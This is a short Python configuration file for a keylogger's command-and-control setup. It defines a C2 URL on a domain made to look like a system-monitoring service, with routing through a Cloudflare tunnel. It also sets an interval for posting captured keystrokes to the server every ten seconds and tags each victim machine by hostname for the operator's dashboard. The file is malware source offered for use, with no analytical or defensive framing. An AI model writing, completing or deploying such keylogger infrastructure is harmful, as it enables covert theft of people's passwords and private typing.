# C2 Server Configuration
import socket

C2_HOST = "https://c2.sysmonitor.homes"
C2_PORT = 443                           # HTTPS port — Cloudflare handles routing to localhost:5000
C2_ENDPOINT = "/log"                    # the route that receives data

# Full URL the keylogger will POST to
# No port appended — Cloudflare handles 443 transparently via the tunnel
C2_URL = f"{C2_HOST}{C2_ENDPOINT}"

# Keylogger Configuration
SEND_INTERVAL = 10                      # send captured keys every X seconds
MACHINE_ID = socket.gethostname()      # identifier for this machine in the dashboards